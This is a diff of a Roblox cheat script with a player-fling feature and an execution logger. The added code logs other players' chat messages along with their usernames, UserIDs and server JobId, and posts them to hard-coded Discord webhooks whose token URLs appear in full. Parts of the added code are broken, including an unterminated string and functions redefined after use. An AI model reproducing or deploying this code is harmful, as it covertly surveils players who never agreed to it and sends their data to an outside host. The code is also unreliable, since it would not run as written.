@@ -460,7 +460,7 @@ local function toggleFling(targetChar)
                 RunService.Heartbeat:Wait()
             end
         end)
-        notify("Pls wait to fling " .. targetChar.Name)
+        notify("Fling ON untuk " .. targetChar.Name)
     else
         if DescendantAddedConnection then DescendantAddedConnection:Disconnect() end
         affectedParts = {}
@@ -715,7 +715,7 @@ end
 toggleBtn.MouseButton1Click:Connect(toggleGUI)
 closeBtn.MouseButton1Click:Connect(toggleGUI)
 
--- title script for map Brookhaven
+-- Execute after GUI is loaded with error handling
 local success, err = pcall(function()
     local args = {
         [1] = "RolePlayName",
@@ -812,7 +812,7 @@ end)
 
 -- setting
 getgenv().whscript = "LockPlayerV5 Ultimate"
-getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1452909860092903455/zFB_zac9f9QAq_7uzvNKb-SyiVlcmaaYfe4fAk-hJk6hAsegSsXcBZvNBOkzVWlClsAG"
+getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1455467986306600962/x-XGtor35OEVocNR8kJNml2NYWm-p_p0kD2GPY0QY8g3rgP3RpQTxAx5w9DPT1DP3iZQ" 
 getgenv().ExecLogSecret = false
 
 -- log script
@@ -879,7 +879,7 @@ else
     local url = getgenv().webhookexecUrl
 
     local data = {
-        ["content"] = "@everyone",
+        ["content"] = "SCRIPT EXECUTE",
         ["embeds"] = {{
             ["title"] = "🚀 **Script Execution Detected | Exec Log**",
             ["description"] = "*A script was executed. Here are the details:*",
@@ -931,7 +931,8 @@ else
     end
 end
 
-getgenv().webhookUrl = "https://discord.com/api/webhooks/1452910669379801171/OEd_33WYixDyvHVgIuH1rtJO-_SOl24XpgShdzvGy5Pf2OWMot3OdbdwgCTGOGul8lmV"
+-- 2
+getgenv().webhookUrl = "https://discord.com/api/webhooks/1455468612054945926/BUTey9sxe5lQo6YUvqb3ljqMFvWGzZ_caH2Sxq8x_tahKjXhwuL1wlnbrlY0dVrz6eLB" 
 
 -- Risk keywords
 local riskKeywords = {"afz", "stars", "st4rs", "star", "st4r"}
@@ -1100,6 +1101,56 @@ local function monitorPlayer(player)
             sendWebhook(embed)
             print("")
         end
+    end)
+end
+
+for _, player in ipairs(game.Players:GetPlayers()) do
+    monitorPlayer(player)
+end
+
+game.Players.PlayerAdded:Connect(monitorPlayer)
+
+-- config
+getgenv().webhookUrl = "https://discord.com/api/webhooks/1455470212055957577/ogdP51Ab8kyClZMlDqr7ygcIrD1CBb5pd7ir0Jriv4rT1Q2As_cn6UlJusAk-BLwNvoA"
+
+-- the webhook
+local function sendWebhook(embed)
+    local data = {
+        ["content"] = "NEW CHAT",
+        ["embeds"] = {embed}
+    }
+    local json = game:GetService("HttpService"):JSONEncode(data)
+    local headers = {["Content-Type"] = "application/json"}
+    local requestFunc = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
+    pcall(function()
+        requestFunc({Url = getgenv().webhookUrl, Body = json, Method = "POST", Headers = headers})
+    end)
+end
+
+-- settings monitor chat
+local function monitorPlayer(player)
+    -- skip main player
+    if player == game.Players.LocalPlayer then return end
+    
+    player.Chatted:Connect(function(msg)
+        -- settings
+        local embed = {
+            ["title"] = "💬 **CHAT DETECTED**",
+            ["description"] = "This player was Chatted",
+            ["color"] = 0x00FF00,
+            ["fields"] = {
+                {["name"] = "👤 **Username**", ["value"] = player.Name, ["inline"] = true},
+                {["name"] = "🏷️ **Display Name**", ["value"] = player.DisplayName or "N/A", ["inline"] = true},
+                {["name"] = "🆔 **UserID**", ["value"] = tostring(player.UserId), ["inline"] = true},
+                {["name"] = "🔗 **JobID**", ["value"] = "```" .. game.JobId .. "```", ["inline"] = false},
+                {["name"] = "💬 **Pesan**", ["value"] = "```" .. msg .. "```", ["inline"] = false},
+                {["name"] = "📝 **Info**", ["value"] = " ", ["inline"] = false}
+            },
+            ["footer"] = {["text"] = "Chat Logger | " .. os.date("%H:%M:%S")}
+        }
+
+        sendWebhook(embed)
+        print(""")
     end)
 end
 
